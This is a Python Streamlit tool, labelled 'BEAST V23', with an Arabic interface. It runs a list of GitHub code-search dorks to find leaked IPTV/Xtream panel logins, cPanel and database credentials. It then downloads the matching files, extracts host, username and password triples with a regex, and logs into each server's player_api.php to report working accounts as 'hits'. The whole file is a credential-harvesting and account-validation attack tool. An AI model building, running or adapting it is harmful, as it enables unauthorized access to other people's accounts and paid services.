import streamlit as st
import requests
import re
import time
from datetime import datetime

st.set_page_config(page_title="BEAST V23 - CASCADE LIVE", layout="wide")

if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - CASCADE FEED</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit {
        background: #0d1117; border: 1px solid #00ff41;
        padding: 10px; border-radius: 5px; margin-bottom: 5px;
        animation: slideIn 0.3s ease-out;
    }
    @keyframes slideIn {
        from { opacity: 0; transform: translateY(-20px); }
        to { opacity: 1; transform: translateY(0); }
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("⚡ BEAST V23")
    token = st.text_input("GitHub Token:", type="password")
    max_pages_per_dork = st.slider("الصفحات لكل Dork", 1, 50, 20)
    start = st.button("🚀 ابدأ الفحص المتسلسل")

st.subheader("📡 الرادار المباشر")
radar_area = st.empty()

st.subheader("🏆 النتائج (تظهر فوراً كشلال)")
hits_container = st.container()  # جميع النتائج ستتراكم هنا

if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:txt "portal.php?username="',
        'extension:php "username" "password" "server" "port"',
        'extension:json "server" "username" "password"',
        'extension:cfg "xtream" "user" "pass"',
        'extension:conf "enigma2" "http" "user"',
        'extension:txt "http://" "user" "pass" "panel"',
        'extension:xml "streaming" "auth"',
        'extension:log "login" "password" "iptv"',
        'path:.env "XTREAM"',
        'path:config.php "db_user" "db_pass"',
        'extension:sql "INSERT INTO users" "password"',
        'extension:txt "xtreamui" "admin"',
        'extension:txt "cpanel" "host" "user" "pass"',
        'extension:conf "stream" "login"',
        'extension:yaml "iptv" "credentials"',
        'extension:ini "portal" "username"',
        'extension:txt "http://" "8080" "username" "password"',
        'extension:txt "http://" "25461" "username" "password"',
        'extension:txt "panel_api.php?username="',
        '"player_api.php?username=" extension:php',
    ]

    found_count = 0
    total_dorks = len(dorks)
    processed_pages = 0

    for idx, dork in enumerate(dorks):
        radar_area.info(f"🔎 Dork {idx+1}/{total_dorks}: {dork[:70]}")
        for page in range(1, max_pages_per_dork + 1):
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res_raw = requests.get(search_url, headers=headers)

                if res_raw.status_code == 403 and 'rate limit' in res_raw.text.lower():
                    reset_time = int(res_raw.headers.get('x-ratelimit-reset', time.time() + 60))
                    wait_seconds = max(1, reset_time - time.time() + 2)
                    radar_area.warning(f"⏳ Rate limit: انتظر {int(wait_seconds)} ثانية...")
                    time.sleep(wait_seconds)
                    page -= 1  # إعادة نفس الصفحة بعد الانتظار
                    continue

                data = res_raw.json()
                if "items" not in data:
                    break
                items = data.get("items", [])
                if not items:
                    break
                processed_pages += 1
                radar_area.info(f"📄 صفحة {page} - {len(items)} ملف")

                for item in items:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=4).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        for host, user, pw in matches:
                            # عرض فوري للسيرفر الذي يتم فحصه
                            radar_area.markdown(f"<p class='scan-log'>🔄 Checking: {host} | {user}</p>", unsafe_allow_html=True)

                            try:
                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r_check = requests.get(check_url, timeout=2)
                                if r_check.status_code == 200:
                                    try:
                                        js = r_check.json()
                                        if js.get("user_info", {}).get("status") == "Active":
                                            found_count += 1
                                            # إضافة النتيجة فوراً إلى الحاوية العلوية (شلال)
                                            with hits_container:
                                                st.markdown(f"""
                                                <div class="active-hit">
                                                    <span class="text-green">✅ HIT #{found_count}</span><br>
                                                    <span class="text-white">HOST: {host}</span><br>
                                                    <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                                </div>
                                                """, unsafe_allow_html=True)
                                    except:
                                        pass
                            except:
                                continue
                    except:
                        continue
                # تأخير خفيف جداً بين الصفحات لتجنب الـ rate limit
                time.sleep(0.2)
            except Exception as e:
                continue

    st.success(f"✅ اكتمل البحث! إجمالي النتائج الشغالة: {found_count}")
    if found_count == 0:
        st.warning("⚠️ لم يتم العثور على نتائج. تحقق من التوكن أو انتظر قليلاً وأعد المحاولة.")
else:
    st.info("👈 أدخل GitHub Token ثم اضغط 'ابدأ الفحص المتسلسل'.")
